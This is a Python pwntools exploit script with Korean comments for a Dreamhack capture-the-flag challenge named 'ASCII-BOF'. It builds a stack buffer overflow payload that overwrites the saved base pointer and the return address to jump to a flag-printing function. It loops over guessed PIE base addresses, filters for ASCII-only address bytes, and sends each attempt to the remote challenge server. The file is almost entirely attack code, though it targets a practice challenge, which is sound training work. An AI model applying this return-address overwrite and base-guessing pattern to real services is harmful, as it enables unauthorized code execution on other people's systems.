#!/usr/bin/env python3

"""
ASCII-BOF 최종 해결 - 정확한 flag 함수 호출
"""

from pwn import *
import re

def final_flag_attack():
    """최종 플래그 공격"""
    print("[+] ASCII-BOF 최종 플래그 공격")
    print("=" * 50)
    
    HOST = 'host8.dreamhack.games'
    PORT = 12458
    
    # objdump에서 확인한 정확한 flag 함수 주소: 0x1339
    flag_offset = 0x1339
    
    # 다양한 PIE 베이스 시도
    pie_bases = [
        0x555555554000,
        0x555555555000,
        0x555555556000,
        0x555555557000,
        0x564000000000,
        0x564000001000,
        0x7f0000000000,
        0x400000,
    ]
    
    for pie_base in pie_bases:
        flag_addr = pie_base + flag_offset
        addr_bytes = p64(flag_addr)[:6]
        
        # ASCII 호환성 체크  
        if not all(0x20 < b < 0x7f for b in addr_bytes):
            print(f"PIE 베이스 0x{pie_base:x}: ASCII 비호환 - 건너뜀")
            continue
        
        print(f"\nPIE 베이스: 0x{pie_base:x}")
        print(f"플래그 함수 주소: 0x{flag_addr:x}")
        print(f"6바이트 주소: {addr_bytes.hex()} ({addr_bytes})")
        
        # 페이로드 구성: 16바이트 버퍼 + 8바이트 RBP + 6바이트 주소
        payload = b"A" * 16        # 16바이트 버퍼 채우기
        payload += b"B" * 8        # 8바이트 RBP 덮어쓰기  
        payload += addr_bytes      # 6바이트 플래그 함수 주소
        
        print(f"페이로드 길이: {len(payload)}")
        print(f"페이로드: {payload}")
        
        try:
            print("서버 연결 중...")
            r = remote(HOST, PORT)
            
            # Welcome 메시지 수신
            welcome = r.recvline()
            print(f"서버 응답: {welcome}")
            
            # 페이로드 전송
            r.send(payload + b'\n')
            print("페이로드 전송 완료")
            
            # 응답 수신
            response = r.recvall(timeout=10)  # 플래그 읽기에 시간이 걸릴 수 있음
            print(f"서버 최종 응답: {response}")
            
            # 플래그 검색
            if b'DH{' in response:
                print("🎉🎉🎉 플래그 발견!")
                flag_match = re.search(rb'DH\{[^}]+\}', response)
                if flag_match:
                    flag = flag_match.group(0).decode()
                    print(f"🏆 ASCII-BOF 플래그: {flag}")
                    return flag
            elif b'Flag is' in response:
                print("🎯 플래그 출력 확인!")
                print(f"전체 응답: {response}")
                # 플래그가 다른 형식일 수 있음
                return response.decode()
            elif b'You are hacker!' in response:
                print("✅ ASCII 체크 통과, 하지만 플래그 없음")
            else:
                print("❓ 예상치 못한 응답")
            
            r.close()
            
        except Exception as e:
            print(f"❌ 오류 발생: {e}")
    
    return None

def test_specific_pie_base():
    """특정 PIE 베이스 집중 테스트"""
    print("\n[+] 특정 PIE 베이스 집중 테스트")
    print("=" * 50)
    
    HOST = 'host8.dreamhack.games'
    PORT = 12458
    
    # 가장 일반적인 PIE 베이스
    pie_base = 0x555555554000
    flag_offset = 0x1339
    flag_addr = pie_base + flag_offset  # 0x555555555339
    
    print(f"테스트 주소: 0x{flag_addr:x}")
    
    # 6바이트 주소: 0x555555555339 → \x39\x53\x55\x55\x55\x55
    addr_bytes = p64(flag_addr)[:6]
    print(f"주소 바이트: {addr_bytes.hex()}")
    
    # 각 바이트의 ASCII 호환성 확인
    for i, b in enumerate(addr_bytes):
        is_ascii = 0x20 < b < 0x7f
        char = chr(b) if is_ascii else '?'
        print(f"바이트 {i}: 0x{b:02x} ({char}) - {'✅' if is_ascii else '❌'}")
    
    if all(0x20 < b < 0x7f for b in addr_bytes):
        print("✅ 모든 바이트가 ASCII 호환!")
        
        payload = b"A" * 16 + b"B" * 8 + addr_bytes
        
        print(f"\n최종 페이로드:")
        print(f"길이: {len(payload)}")
        print(f"hex: {payload.hex()}")
        print(f"raw: {payload}")
        
        try:
            r = remote(HOST, PORT)
            r.recvline()
            r.send(payload + b'\n')
            
            response = r.recvall(timeout=10)
            print(f"\n응답: {response}")
            
            if b'DH{' in response or b'Flag is' in response:
                print("🎉 성공!")
                return response.decode()
            
            r.close()
            
        except Exception as e:
            print(f"오류: {e}")
    else:
        print("❌ ASCII 비호환 바이트 존재")
    
    return None

if __name__ == "__main__":
    print("🎯 ASCII-BOF 최종 해결 시도")
    print("=" * 60)
    
    # 1. 특정 PIE 베이스로 정확한 시도
    result = test_specific_pie_base()
    
    if not result:
        # 2. 다양한 PIE 베이스로 시도
        result = final_flag_attack()
    
    if result:
        print(f"\n🎉🎉🎉 ASCII-BOF 해결 성공!")
        print(f"🏆 최종 결과: {result}")
    else:
        print("\n😞 아직 해결하지 못했습니다.")
        print("계속 시도해봅시다!")
